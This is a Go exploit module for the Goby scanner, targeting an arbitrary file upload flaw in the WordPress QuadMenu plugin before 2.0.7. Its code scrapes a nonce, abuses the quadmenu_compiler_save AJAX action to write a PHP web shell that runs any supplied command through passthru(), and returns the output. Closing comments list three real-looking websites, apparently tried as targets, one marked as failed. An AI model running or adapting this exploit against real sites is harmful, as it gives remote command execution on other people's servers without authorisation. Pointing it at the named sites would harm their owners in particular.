package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin QuadMenu admin-ajax.php output File Upload Vulnerability",
    "Description": "<p>WordPress Plugin QuadMenu is a best responsive mega menu plugin designed for theme developers with customizable menu layout and megamenu drag and drop fields.</p><p>WordPress Plugin QuadMenu &lt;2.0.7 has an arbitrary file upload vulnerability. The vulnerability is due to compiler_save not verifying the suffix of the uploaded file, and an attacker can upload a Trojan horse to obtain server permissions.</p>",
    "Product": "wordpress-plugin-quadmenu",
    "Homepage": "https://wordpress.org/plugins/quadmenu/",
    "DisclosureDate": "2021-02-11",
    "Author": "h1ei1",
    "FofaQuery": "body=\"wp-content/plugins/quadmenu\"",
    "GobyQuery": "body=\"wp-content/plugins/quadmenu\"",
    "Level": "2",
    "Impact": "<p>WordPress Plugin QuadMenu &lt;2.0.7 has an arbitrary file upload vulnerability. The vulnerability is due to compiler_save not verifying the suffix of the uploaded file, and an attacker can upload a Trojan horse to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/quadmenu/.\">https://wordpress.org/plugins/quadmenu/.</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/a69ead38-93ed-460d-ba1d-0e1446850ef4"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "WordPress QuadMenu 插件 admin-ajax.php 文件 output 参数任意文件上传漏洞",
            "Product": "wordpress-plugin-quadmenu",
            "Description": "<p>WordPress Plugin QuadMenu 是一款为主题开发人员设计的最佳响应式巨型菜单插件，具有可自定义的菜单布局和megamenu拖放字段。<br></p><p>WordPress Plugin QuadMenu &lt;2.0.7版本存在任意文件上传漏洞，该漏洞源于compiler_save没有校验上传文件后缀，攻击者可上传木马获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://wordpress.org/plugins/quadmenu/\">https://wordpress.org/plugins/quadmenu/</a>。<br></p>",
            "Impact": "<p>WordPress Plugin QuadMenu &lt;2.0.7版本存在任意文件上传漏洞，该漏洞源于compiler_save没有校验上传文件后缀，攻击者可上传木马获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin QuadMenu admin-ajax.php output File Upload Vulnerability",
            "Product": "wordpress-plugin-quadmenu",
            "Description": "<p>WordPress Plugin QuadMenu is a best responsive mega menu plugin designed for theme developers with customizable menu layout and megamenu drag and drop fields.<br></p><p>WordPress Plugin QuadMenu &lt;2.0.7 has an arbitrary file upload vulnerability. The vulnerability is due to compiler_save not verifying the suffix of the uploaded file, and an attacker can upload a Trojan horse to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/quadmenu/.\">https://wordpress.org/plugins/quadmenu/.</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">WordPress Plugin QuadMenu &lt;2.0.7 has an arbitrary file upload vulnerability. The vulnerability is due to compiler_save not verifying the suffix of the uploaded file, and an attacker can upload a Trojan horse to obtain server permissions.</span><br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10801"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "var quadmenu = {\"nonce\":\"") {

				nonceFind := regexp.MustCompile("var quadmenu = {\"nonce\":\"(.*?)\",\"gutter\":").FindStringSubmatch(resp.RawBody)
				uri2 := "/wp-admin/admin-ajax.php"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg2.Data = fmt.Sprintf("action=quadmenu_compiler_save&nonce=%s&output[imports][0]=info.php&output[css]=<?php%%20echo%%20md5(233);unlink(__FILE__);?>", nonceFind[1])
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && strings.Contains(resp2.RawBody, "/wp-content\\/uploads\\/") {
					pathFind := regexp.MustCompile("/wp-content\\\\/uploads\\\\/(.*?)\\\\/info.php").FindStringSubmatch(resp2.RawBody)
					uri3 := fmt.Sprintf("/wp-content/uploads/%s/info.php", pathFind[1])
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
						return resp3.StatusCode == 200 && strings.Contains(resp3.RawBody, "e165421110ba03099a1c0393373c5b43")
					}
				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, "var quadmenu = {\"nonce\":\"") {

				nonceFind := regexp.MustCompile("var quadmenu = {\"nonce\":\"(.*?)\",\"gutter\":").FindStringSubmatch(resp.RawBody)
				uri2 := "/wp-admin/admin-ajax.php"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg2.Data = fmt.Sprintf("action=quadmenu_compiler_save&nonce=%s&output[imports][0]=info.php&output[css]=<?php%%20passthru(\"%s\");?>", nonceFind[1], cmd)
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && strings.Contains(resp2.RawBody, "/wp-content\\/uploads\\/") {

					pathFind := regexp.MustCompile("/wp-content\\\\/uploads\\\\/(.*?)\\\\/info.php").FindStringSubmatch(resp2.RawBody)
					uri3 := fmt.Sprintf("/wp-content/uploads/%s/info.php", pathFind[1])
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
						expResult.Output = resp3.RawBody
						expResult.Success = true
					}
				}

			}
			return expResult
		},
	))
}

//https://www.ecubix.com //失败
//https://accessresidencies.com
//https://www.accessresidencies.chagallsrilanka.com